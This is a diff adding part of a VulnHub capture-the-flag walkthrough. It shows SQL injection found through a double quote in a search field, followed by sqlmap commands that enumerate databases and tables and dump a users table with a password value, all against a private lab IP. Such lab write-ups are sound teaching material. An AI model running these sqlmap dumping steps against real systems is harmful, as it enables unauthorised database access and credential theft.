@@ -109,11 +109,47 @@ just provide the `elite` in the key input box and you will see the below page :
 
 ![index](https://github.com/Git-K3rnel/VulnHub/assets/127470407/80cac999-57d2-4378-862a-a7cbfa7c47f7)
 
+i entered a double qoute ( `"` ) in the search box and an error is shown :
 
+![sqlerror](https://github.com/Git-K3rnel/VulnHub/assets/127470407/c5ddd4c3-339f-4476-b736-8fa4df16fc40)
 
+simply use `sqlmap` to dump the database :
 
+```text
+root@kali: sqlmap -u "http://192.168.127.232/kzMb5nVYJw/420search.php?usrtosearch=t" --batch --dbs
 
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] seth
+```
 
+we are interested in `seth` databse so let's see the tables :
+
+```text
+root@kali: sqlmap -u "http://192.168.127.232/kzMb5nVYJw/420search.php?usrtosearch=t" --batch -D seth --tables
+
+[1 table]
++-------+
+| users |
++-------+
+```
+
+and finally dump `users` table :
+
+```text
+root@kali: sqlmap -u "http://192.168.127.232/kzMb5nVYJw/420search.php?usrtosearch=t" --batch -T users --dump
+
+[2 entries]
++----+---------------------------------------------+--------+------------+
+| id | pass                                        | user   | position   |
++----+---------------------------------------------+--------+------------+
+| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
+| 2  | --not allowed--                             | isis   | employee   |
++----+---------------------------------------------+--------+------------+
+```
 
 
 
